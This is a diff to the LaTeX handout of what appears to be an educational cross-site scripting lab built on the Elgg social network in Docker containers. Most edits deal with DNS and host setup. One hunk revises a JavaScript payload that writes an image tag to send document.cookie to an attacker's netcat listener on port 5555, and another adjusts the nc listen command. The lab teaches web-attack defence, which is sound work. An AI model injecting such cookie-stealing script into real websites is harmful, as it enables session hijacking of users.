@@ -89,6 +89,27 @@ Detailed coverage of the Cross-Site Scripting attack can be found in the followi
 % -------------------------------------------
 % SUBSECTION
 % -------------------------------------------
+\subsection{DNS Setup} 
+
+We have set up several websites for this lab. They are hosted 
+by the container \texttt{10.9.0.5}. We need to map 
+the names of the web server to this IP address. 
+Please add the following entries to \texttt{/etc/hosts}.
+You need to use the root privilege to modify this file:
+
+\begin{lstlisting}
+10.9.0.5        www.xsslabelgg.com
+10.9.0.5        www.example32a.com
+10.9.0.5        www.example32b.com
+10.9.0.5        www.example32c.com
+10.9.0.5        www.example60.com
+10.9.0.5        www.example70.com
+\end{lstlisting}
+ 
+
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
 \subsection{Container Setup and Commands}
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
@@ -102,46 +123,15 @@ Detailed coverage of the Cross-Site Scripting attack can be found in the followi
 % -------------------------------------------
 \subsection{Elgg Web Application}
 
-
 We use an open-source web application called {\tt Elgg} in this lab.
 {\tt Elgg} is a web-based social-networking application.
-It is already set up in the provided container images.
+It is already set up in the provided container images, 
+and its URL is \url{http://www.xsslabelgg.com}.
 We use two containers, one running the web server (\texttt{10.9.0.5}) ,
 and the other running the MySQL database (\texttt{10.9.0.6}). 
 The IP addresses for these two containers are hardcoded in various 
 places in the configuration, so please do not change them from
 the \texttt{docker-compose.yml} file. 
-
-\paragraph{The Elgg container.}
-We host the Elgg web application using the Apache web server. 
-The website setup is included in 
-\texttt{apache\_elgg\_xss.conf} inside the Elgg image folder. 
-The configuration specifies the URL for the website and 
-the folder where the web application code is stored. 
-
-\begin{lstlisting}
-<VirtualHost *:80>
-     DocumentRoot /var/www/elgg
-     ServerName http://www.xsslabelgg.com
-     <Directory /var/www/elgg>
-          Options FollowSymlinks
-          AllowOverride All
-          Require all granted
-     </Directory>
-</VirtualHost>
-\end{lstlisting}
-
-
-\paragraph{DNS configuration.} 
-We access the Elgg website on the VM using 
-the \url{http://www.xsslabelgg.com} URL.
-The URL is only accessible from inside of the virtual machine, because we
-have modified the \texttt{/etc/hosts} file to map the hostname
-of the URL to the IP address \texttt{10.9.0.5}:
-
-\begin{lstlisting}
-10.9.0.5   www.xsslabelgg.com
-\end{lstlisting}
 
 
 % MySQL database
@@ -159,6 +149,13 @@ of the URL to the IP address \texttt{10.9.0.5}:
 % SECTION
 % ******************************************* 
 \section{Lab Tasks}
+
+When you copy and paste code from this PDF file, very often, the 
+quotation marks, especially single quote, may turn into 
+a different symbol that looks similar. They will cause 
+errors in the code, so keep that in mind. When that happens,
+delete them, and manually type those symbols.
+
 
 
 % -------------------------------------------
@@ -244,11 +241,11 @@ the {\tt img} tag, the browser tries to load the image from the URL in
 the {\tt src} field; this results in an HTTP GET request sent to the attacker's
 machine. The
 JavaScript given below sends the cookies to the port 5555 of the
-attacker's machine (with IP address {\tt 10.1.2.5}), where the attacker has a TCP server
+attacker's machine (with IP address {\tt 10.9.0.1}), where the attacker has a TCP server
 listening to the same port.  
 
 \begin{lstlisting}
-<script>document.write('<img src=http://10.1.2.5:5555?c=' 
+<script>document.write('<img src=http://10.9.0.1:5555?c=' 
                        + escape(document.cookie) + '   >'); 
 </script> 
 \end{lstlisting}
@@ -261,12 +258,13 @@ client whatever is typed by the user running the server. Type the command below 
 port \texttt{5555}:
 
 \begin{lstlisting}
-$ nc -lnv 5555 
+$ nc -lknv 5555 
 \end{lstlisting}
 
-\noindent The "{\tt -l}" option is used to specify that nc should listen for an incoming
-connection rather than initiate a connection to a remote host. The "{\tt -nv}" option is used to
-have \texttt{nc} give more verbose output.
+\noindent The \texttt{-l} option is used to specify that nc should listen for an incoming
+connection rather than initiate a connection to a remote host. The \texttt{-nv} option is used to
+have \texttt{nc} give more verbose output. The \texttt{-k} option means when a connection
+is completed, listen for another one.
 
 
 % -------------------------------------------
@@ -599,7 +597,8 @@ changes to take effect:
 We will access the above websites from our VM. 
 To access them through their respective URLs, 
 we need to add the following entries to the 
-\texttt{/etc/hosts} file, so these hostnames are mapped to 
+\texttt{/etc/hosts} file (if you have not done so already
+at the beginning of the lab), so these hostnames are mapped to 
 the IP address of the server container (\texttt{10.9.0.5}). 
 You need to use the root privilege to 
 change this file (using \texttt{sudo}).
